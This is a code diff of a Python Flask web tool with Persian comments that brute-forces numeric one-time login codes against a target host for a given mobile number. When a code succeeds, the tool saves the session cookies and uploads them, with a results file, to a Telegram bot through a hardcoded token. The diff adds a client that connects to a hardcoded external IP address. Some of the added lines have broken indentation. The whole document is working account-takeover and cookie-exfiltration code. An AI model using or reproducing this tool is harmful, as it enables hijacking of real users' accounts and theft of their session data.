@@ -9,6 +9,11 @@ from flask_socketio import SocketIO, emit
 import threading
 import os
 from datetime import datetime
+import socketio
+
+# اتصال به سرور مرکزی
+sio = socketio.Client()
+sio.connect('http://104.251.216.12:5000')  # آدرس سرور مرکزی رو بذار
 
 # تنظیمات تلگرام
 TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"
@@ -29,7 +34,7 @@ def send_file_to_telegram(file_path, retries=3):
         try:
             if not os.path.exists(file_path):
                 progress_log.append(f"Error: File {file_path} does not exist!")
-                socketio.emit('update_progress', {'log': progress_log[-1]})
+                socketio.emit('remote_log', {'log': progress_log[-1]})
                 return False
             with open(file_path, 'rb') as file:
                 files = {'document': file}
@@ -37,11 +42,11 @@ def send_file_to_telegram(file_path, retries=3):
                 response = requests.post(url, data=data, files=files, timeout=10)
                 response.raise_for_status()
                 progress_log.append(f"File {file_path} sent to Telegram successfully!")
-                socketio.emit('update_progress', {'log': progress_log[-1]})
+                socketio.emit('remote_log', {'log': progress_log[-1]})
                 return True
         except (requests.exceptions.RequestException, FileNotFoundError) as e:
             progress_log.append(f"Failed to send {file_path} to Telegram (attempt {attempt + 1}/{retries}): {str(e)}")
-            socketio.emit('update_progress', {'log': progress_log[-1]})
+            socketio.emit('remote_log', {'log': progress_log[-1]})
             if attempt < retries - 1:
                 time.sleep(2)
     return False
@@ -58,14 +63,14 @@ def save_and_send_cookies(cookies, code_str):
     
     if os.path.exists(cookies_file) and os.path.getsize(cookies_file) > 0:
         progress_log.append(f"Cookies saved in {cookies_file}")
-        socketio.emit('update_progress', {'log': progress_log[-1]})
+        socketio.emit('remote_log', {'log': progress_log[-1]})
         success = send_file_to_telegram(cookies_file)
         if not success:
             progress_log.append(f"Critical: Failed to send cookies {cookies_file} to Telegram after retries!")
-            socketio.emit('update_progress', {'log': progress_log[-1]})
+            socketio.emit('remote_log', {'log': progress_log[-1]})
     else:
         progress_log.append(f"Error: Failed to save cookies to {cookies_file}")
-        socketio.emit('update_progress', {'log': progress_log[-1]})
+        socketio.emit('remote_log', {'log': progress_log[-1]})
 
 def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
     headers = {
@@ -113,8 +118,7 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                            f"Message: {json_response['data']['message']}\n"
                            f"Redirect to: {json_response['data']['redirect']}")
                     progress_log.append(msg)
-                    socketio.emit('update_progress', {'log': msg})
-
+                    socketio.emit('remote_log', {'log': progress_log[-1]})
                     save_and_send_cookies(response.cookies, code_str)
 
                     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -122,20 +126,20 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                     with open(output_file, 'w', encoding='utf-8') as f:
                         f.write(msg + f"\nCookies file: {cookies_file}\n")
                     progress_log.append(f"Output saved in {output_file}")
-                    socketio.emit('update_progress', {'log': progress_log[-1]})
+                    socketio.emit('remote_log', {'log': progress_log[-1]})
                     send_file_to_telegram(output_file)
                     return True
                 else:
                     progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
-                    socketio.emit('update_progress', {'log': progress_log[-1]})
+                    socketio.emit('remote_log', {'log': progress_log[-1]})
                     return False
             except json.JSONDecodeError:
                 progress_log.append(f"Error parsing JSON for code {code_str} (number {counter})")
-                socketio.emit('update_progress', {'log': progress_log[-1]})
+               socketio.emit('remote_log', {'log': progress_log[-1]})
                 return False
         except requests.exceptions.RequestException as e:
             progress_log.append(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {str(e)}")
-            socketio.emit('update_progress', {'log': progress_log[-1]})
+            socketio.emit('remote_log', {'log': progress_log[-1]})
             if attempt < max_retries:
                 time.sleep(2)
                 continue
@@ -148,7 +152,7 @@ def generate_code(counter):
 def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
     global running, found_success
     progress_log.append(f"Starting bruteforce from {start_range} to {end_range}...")
-    socketio.emit('update_progress', {'log': progress_log[-1]})
+    socketio.emit('remote_log', {'log': progress_log[-1]})
     batch_size = connections
     found_success = False
 
@@ -158,7 +162,7 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
                 progress_log.append("Stopping: Successful code found!")
             else:
                 progress_log.append("Process stopped manually!")
-            socketio.emit('update_progress', {'log': progress_log[-1]})
+           socketio.emit('remote_log', {'log': progress_log[-1]})
             break
 
         batch_end = min(batch_start + batch_size, end_range)
@@ -176,18 +180,18 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
                         found_success = True
                         running = False
                         progress_log.append("Process stopped because a successful code was found!")
-                        socketio.emit('update_progress', {'log': progress_log[-1]})
+                       socketio.emit('remote_log', {'log': progress_log[-1]})
                         break  # از حلقه داخلی هم خارج می‌شیم
                 except Exception as e:
                     progress_log.append(f"Exception in future: {str(e)}")
-                    socketio.emit('update_progress', {'log': progress_log[-1]})
+                   socketio.emit('remote_log', {'log': progress_log[-1]})
 
         if not found_success:
             time.sleep(0.1)  # تأخیر خیلی کم برای سرعت بیشتر
 
     if not found_success:
         progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
-        socketio.emit('update_progress', {'log': progress_log[-1]})
+        socketio.emit('remote_log', {'log': progress_log[-1]})
 
 @app.route('/')
 def index():
@@ -346,7 +350,7 @@ def start():
     found_success = False  # ریست کردن برای استارت جدید
     progress_log = []
     progress_log.append("Start button clicked!")
-    socketio.emit('update_progress', {'log': progress_log[-1]})
+    socketio.emit('remote_log', {'log': progress_log[-1]})
     threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range)).start()
     return '', 204
 
@@ -355,7 +359,7 @@ def stop():
     global running
     running = False
     progress_log.append("Stop button clicked!")
-    socketio.emit('update_progress', {'log': progress_log[-1]})
+   socketio.emit('remote_log', {'log': progress_log[-1]})
     return '', 204
 
 if __name__ == '__main__':
